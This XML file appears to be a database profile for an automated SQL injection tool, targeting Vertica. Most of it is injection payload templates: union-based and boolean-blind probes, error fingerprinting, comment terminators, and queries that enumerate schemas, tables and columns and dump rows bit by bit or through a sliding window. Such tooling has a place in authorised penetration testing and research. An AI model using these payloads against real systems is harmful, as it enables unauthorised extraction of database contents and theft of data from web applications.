<?xml version="1.0" encoding="UTF-8"?>
<model>
    <vendor></vendor>
    <resource>
        <info>
select
    '${ENCLOSE_VALUE_SQL}'
    || version()
    || '${ENCLOSE_VALUE_SQL}'
    || current_database()
    || '${ENCLOSE_VALUE_SQL}'
    || user
    || '${TRAIL_SQL}'
        </info>
        <schema>
            <database>
select 
    rr
    ||'${TRAIL_SQL}'
    r
from (
    select distinct
        '${ENCLOSE_VALUE_SQL}'
        || table_schema
        || '${SEPARATOR_QTE_SQL}'
        || '0'
        || '${ENCLOSE_VALUE_SQL}'
        rr
    from v_catalog.tables
    order by rr
    {limit}
)x
            </database>
            <table>
select 
    rr
    ||'${TRAIL_SQL}'
    r
from (
    select distinct
        '${ENCLOSE_VALUE_SQL}'
        || table_name
        || '${SEPARATOR_QTE_SQL}'
        || '0'
        || '${ENCLOSE_VALUE_SQL}'
        rr
    from v_catalog.tables
    where TABLE_SCHEMA = '${DATABASE}'
    order by rr
    {limit}
)x
            </table>
            <column>
select 
    rr
    ||'${TRAIL_SQL}'
    r
from (
    select distinct
        '${ENCLOSE_VALUE_SQL}'
        || column_name
        || '${SEPARATOR_QTE_SQL}'
        || '0'
        || '${ENCLOSE_VALUE_SQL}'
        rr
    from v_catalog.columns
    where columns.TABLE_SCHEMA = '${DATABASE}'
    and columns.TABLE_name = '${TABLE}'
    order by rr
    {limit}
)x
            </column>
            <row>
                <query>
                
select 
    rr
    ||'${TRAIL_SQL}'
    r
from (
    select distinct
        '${ENCLOSE_VALUE_SQL}'
        || (${FIELDS})
        || '${SEPARATOR_QTE_SQL}'
        || '0'
        || '${ENCLOSE_VALUE_SQL}'
        rr
    from ${DATABASE}.${TABLE}
    order by rr
    {limit}
)x
                </query>
                <fields>
                <field>
trim(
    coalesce(
        ${FIELD}::varchar,
        ''
    )
)
                </field>
                <concat>|| '%7f' ||</concat>
                </fields>
            </row>
        </schema>
    </resource>
    <strategy>
        <configuration>
            <slidingWindow>
select
    /**
     * If reach end of string (${LEAD}i) then NULLIF nullifies the result
     */
    '${LEAD}'
    || NULLIF(
        substr(
            (${INJECTION}),
            ${INDEX},
            65536
        ),
        '${TRAIL_SQL}'
    )
            </slidingWindow>
            <limit>limit 1 offset ${LIMIT}</limit>
            <failsafe>(1337${INDICE}7330%2b1)::varchar</failsafe>
            <calibrator>repeat(chr(35), 1024)</calibrator>
            <limitBoundary>0</limitBoundary>
            <endingComment>--+</endingComment>
            <fingerprint>
                <errorMessage>vertica</errorMessage>
            </fingerprint>
        </configuration>
        <normal>
            <indices>union select ${INDICES}</indices>
            <capacity>(select '${LEAD}' || ${INDICE} || ${CALIBRATOR})</capacity>
            <orderBy>order by 1337</orderBy>
        </normal>
        <boolean>
            <test>
                <false>true = false</false>
                <false>true %21= true</false>
                <false>false %21= false</false>
                <false>1 = 2</false>
                <false>1 %21= 1</false>
                <false>2 %21= 2</false>
                <true>true = true</true>
                <true>false = false</true>
                <true>true %21= false</true>
                <true>1 = 1</true>
                <true>2 = 2</true>
                <true>1 %21= 2</true>
                <initialization>0%2b1 = 1</initialization>
                <bit><![CDATA[
/**
 * true bit return bit, false bit return 0
 * 8 & 8 = 8, 8 & 4 = 0
 */
0 != (
    ascii(
        substr(
            (${INJECTION}),
            ${INDEX},
            1
        )
    ) %26 ${BIT}
)
                ]]></bit>
                <length>char_length((${INJECTION})) > ${INDEX}</length>
            </test>
            <blind>and ${TEST}</blind>
        </boolean>
    </strategy>
</model>